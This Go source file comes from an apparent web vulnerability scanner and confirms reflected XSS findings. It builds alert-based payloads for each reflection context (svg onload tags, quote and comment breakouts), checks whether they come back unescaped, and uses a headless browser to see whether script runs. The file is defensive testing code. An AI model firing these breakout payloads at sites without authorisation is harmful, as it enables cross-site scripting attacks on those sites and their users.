package xss_light_scanner

import (
	"context"
	"crypto/rand"
	"encoding/hex"
	"strings"
	"time"

	"github.com/vigolium/vigolium/pkg/http"
	"github.com/vigolium/vigolium/pkg/httpmsg"
	"github.com/vigolium/vigolium/pkg/spitolas"
)

// Reflected XSS confirmation pipeline.
//
// The character-transform analysis only tells us a breakout *character* survived
// — it cannot tell whether the surrounding bytes form an executable context.
// Salesforce Aura, JSON echo endpoints and CSP-locked pages all reflect quotes
// and angle brackets verbatim without ever executing script, which is exactly
// the JSStringDQBreakout-style false positive this module used to report at
// High/Firm. Confirmation re-sends a real, context-shaped XSS payload and grades
// the candidate in two tiers:
//
//	tier 1 (drop)  the executable payload's breakout signature never reappears
//	               unescaped in the body — the per-char heuristic was wrong.
//	tier 2 (Low)   the signature survived but no JavaScript dialog fired (no
//	               browser, or execution blocked by CSP / a non-executing
//	               context) — reflection-only, tentative.
//	tier 3 (High)  a headless browser navigation popped alert(marker) — the
//	               canonical confirmed-XSS signal.
const (
	confirmNavTimeout    = 25 * time.Second
	confirmWaitExtra     = 700 * time.Millisecond
	maxConfirmContexts   = 3
	maxConfirmProbes     = 2 // concurrent headless browsers across the package
	confirmSigPreviewLen = 48
)

// ProbeFunc navigates a URL in a headless browser and returns any JavaScript
// dialogs that fired. Injectable so tests never spawn a real browser.
type ProbeFunc func(ctx context.Context, cfg spitolas.ProbeConfig) (*spitolas.ProbeResult, error)

// probeSem bounds concurrent browser probes — each spawns a real browser
// process, far pricier than an HTTP request. Findings here are rare, so a small
// global cap is plenty.
var probeSem = make(chan struct{}, maxConfirmProbes)

func acquireProbe(ctx context.Context) (release func(), ok bool) {
	select {
	case probeSem <- struct{}{}:
		return func() { <-probeSem }, true
	case <-ctx.Done():
		return nil, false
	}
}

// confirmOutcome records how strongly a reflected-XSS candidate was confirmed.
type confirmOutcome struct {
	httpBreakout     bool   // executable payload's breakout signature survived unescaped
	browserConfirmed bool   // a JS dialog carrying our marker actually fired
	browserRan       bool   // a browser navigation was attempted
	marker           string // unique alert marker
	dialogMessage    string // captured dialog text on a confirm
	request          string // raw fuzzed request that carried the executable payload
	signature        string // the breakout signature matched in the body
	bodySnippet      string // window of the response body around the surviving signature
}

// snippetAround returns a bounded window of body centred on the first occurrence
// of sig, so the finding can show the exact bytes that landed in the response.
func snippetAround(body, sig string) string {
	idx := strings.Index(body, sig)
	if idx < 0 {
		return ""
	}
	const pad = 80
	start := idx - pad
	if start < 0 {
		start = 0
	}
	end := idx + len(sig) + pad
	if end > len(body) {
		end = len(body)
	}
	return body[start:end]
}

// newConfirmMarker returns a unique, JS-safe token placed inside alert() so a
// fired dialog can be attributed to this scan and not a pre-existing page alert.
func newConfirmMarker() string {
	buf := make([]byte, 5)
	if _, err := rand.Read(buf); err != nil {
		return "vigxss0confirm"
	}
	return "vigx" + hex.EncodeToString(buf)
}

// execContextPayload returns an executable XSS payload tailored to the reflection
// context plus the literal breakout signatures that must appear UNESCAPED in the
// response body for the breakout to count. The marker rides inside alert() (via a
// template literal so it never collides with the breakout quote).
func execContextPayload(rc ReflectionContext, marker string) (payload string, signatures []string) {
	alert := "alert(`" + marker + "`)"
	svg := "<svg onload=" + alert + ">"

	switch rc {
	// Raw HTML / text node — inject a fresh element directly.
	case HTMLGeneric, HTMLTagCloseAndInject, XMLGeneric:
		return svg, []string{svg}
	case HTMLAfterTitleClose:
		return "</title>" + svg, []string{"</title>" + svg, svg}
	case HTMLAfterXMPClose:
		return "</xmp>" + svg, []string{"</xmp>" + svg, svg}
	case HTMLAfterNoscriptClose:
		return "</noscript>" + svg, []string{"</noscript>" + svg, svg}

	// Attribute values & event/URL handlers — break the quote, close the tag,
	// inject. The quoted signature is strongest; the bare element is the
	// fallback (covers apps that strip the quote but keep the markup).
	case HTMLAttributeValueDQBreakout, JSInURLAttributeDQ, JSInEventHandlerDQ:
		return `">` + svg, []string{`">` + svg, svg}
	case HTMLAttributeValueSQBreakout, JSInURLAttributeSQ, JSInEventHandlerSQ:
		return `'>` + svg, []string{`'>` + svg, svg}
	case HTMLAttributeValueBTBreakout, JSInURLAttributeBT, JSInEventHandlerBT:
		return "`>" + svg, []string{"`>" + svg, svg}
	case HTMLAttributeValueUnquotedBreakout, JSInUnquotedURLAttribute, JSInEventHandlerUnquoted:
		return " " + svg, []string{" " + svg, svg}
	case HTMLAttributeName:
		return ">" + svg, []string{">" + svg, svg}

	// JS string contexts — break the quote and run code.
	case JSStringDQBreakout:
		return `";` + alert + "//", []string{`";` + alert, alert}
	case JSStringSQBreakout:
		return `';` + alert + "//", []string{`';` + alert, alert}
	case JSTemplateLiteral:
		return "${" + alert + "}", []string{"${" + alert + "}", alert}
	case JSCodeStatement:
		return ";" + alert + "//", []string{";" + alert, alert}

	// Comment contexts — close the comment, then inject.
	case HTMLCommentBreakout:
		return "--><svg onload=" + alert + ">", []string{"-->" + svg, svg}
	case JSLineComment:
		return "\n" + alert + "//", []string{alert}
	case JSBlockComment:
		return "*/" + alert + "//", []string{"*/" + alert, alert}

	default:
		return svg, []string{svg}
	}
}

// prefixByName resolves the winning bypass prefix so the confirmation payload is
// shaped the same way the canary that triggered detection was.
func prefixByName(name string) BypassPrefix {
	for _, p := range BypassPrefixes {
		if p.Name == name {
			return p
		}
	}
	return BypassPrefixes[0] // "none"
}

// distinctContexts returns up to maxConfirmContexts unique reflection contexts in
// discovery order, so confirmation tries the most-confident one first.
func distinctContexts(analyses []*EscapeAnalysis, limit int) []ReflectionContext {
	seen := make(map[ReflectionContext]bool)
	var out []ReflectionContext
	for _, ea := range analyses {
		if ea == nil || seen[ea.Context] {
			continue
		}
		seen[ea.Context] = true
		out = append(out, ea.Context)
		if len(out) >= limit {
			break
		}
	}
	return out
}

// confirmCandidate re-sends a real XSS payload for each exploitable context and
// returns the strongest outcome. It stops at the first context whose breakout
// signature survives in the body (then attempts a browser confirm); if none
// survive it returns the last attempt (httpBreakout=false → caller drops it).
func (m *ParamDiscoveryModule) confirmCandidate(
	ctx *httpmsg.HttpRequestResponse,
	ip httpmsg.InsertionPoint,
	result *XSSScanResult,
	httpClient *http.Requester,
) confirmOutcome {
	prefix := prefixByName(result.UsedPrefix)
	var last confirmOutcome
	for _, rc := range distinctContexts(result.ExploitableAnalyses, maxConfirmContexts) {
		out := m.attemptContext(ctx, ip, rc, prefix, httpClient)
		last = out
		if out.httpBreakout {
			return out
		}
	}
	return last
}

// attemptContext sends the executable payload for one context, checks the body
// for a surviving breakout signature, and — on a hit for a navigable GET —
// confirms execution in a headless browser.
func (m *ParamDiscoveryModule) attemptContext(
	ctx *httpmsg.HttpRequestResponse,
	ip httpmsg.InsertionPoint,
	rc ReflectionContext,
	prefix BypassPrefix,
	httpClient *http.Requester,
) confirmOutcome {
	out := confirmOutcome{marker: newConfirmMarker()}
	payload, signatures := execContextPayload(rc, out.marker)
	payload = string(prefix.Bytes) + payload

	fuzzedRaw := ip.BuildRequest([]byte(payload))
	out.request = string(fuzzedRaw)
	fuzzedReq, err := httpmsg.ParseRawRequest(string(fuzzedRaw))
	if err != nil {
		return out
	}
	fuzzedReq = fuzzedReq.WithService(ctx.Service())

	// NoClustering: the executable payload differs from the canary, but a fresh
	// send guarantees we never read back a cluster-cached response.
	resp, _, err := httpClient.Execute(fuzzedReq, http.Options{NoClustering: true})
	if err != nil || resp == nil {
		return out
	}
	status := 0
	if r := resp.Response(); r != nil {
		status = r.StatusCode
	}
	body := resp.Body().String()
	resp.Close()

	// Redirects and error pages don't carry an exploitable reflection.
	if status >= 300 {
		return out
	}

	for _, sig := range signatures {
		if sig != "" && strings.Contains(body, sig) {
			out.httpBreakout = true
			out.signature = sig
			out.bodySnippet = snippetAround(body, sig)
			break
		}
	}
	if !out.httpBreakout {
		return out
	}

	m.browserConfirm(&out, fuzzedReq)
	return out
}

// browserConfirm navigates the fuzzed GET request in a headless browser and
// flips browserConfirmed when a dialog carrying our marker fires. A missing
// Probe, a non-GET request, or an unavailable browser simply leaves the outcome
// at the httpBreakout (Low) tier.
func (m *ParamDiscoveryModule) browserConfirm(out *confirmOutcome, fuzzedReq *httpmsg.HttpRequestResponse) {
	if m.Probe == nil {
		return
	}
	method := strings.ToUpper(fuzzedReq.Request().Method())
	if method != "GET" && method != "" {
		return
	}
	urlx, err := fuzzedReq.Request().URL()
	if err != nil {
		return
	}

	bgCtx, cancel := context.WithTimeout(context.Background(), confirmNavTimeout+5*time.Second)
	defer cancel()

	release, ok := acquireProbe(bgCtx)
	if !ok {
		return
	}
	defer release()

	out.browserRan = true
	// The error is intentionally ignored: a nav error can still carry dialogs
	// (a javascript: URL errors out *after* firing alert), so inspect dialogs
	// regardless. A truly failed probe simply yields res == nil below.
	res, _ := m.Probe(bgCtx, spitolas.ProbeConfig{
		URL:        urlx.String(),
		WaitExtra:  confirmWaitExtra,
		NavTimeout: confirmNavTimeout,
	})
	if res == nil {
		return
	}
	for i := range res.Dialogs {
		if strings.Contains(res.Dialogs[i].Message, out.marker) {
			out.browserConfirmed = true
			out.dialogMessage = res.Dialogs[i].Message
			return
		}
	}
}

func sigPreview(sig string) string {
	if len(sig) > confirmSigPreviewLen {
		return sig[:confirmSigPreviewLen] + "…"
	}
	return sig
}
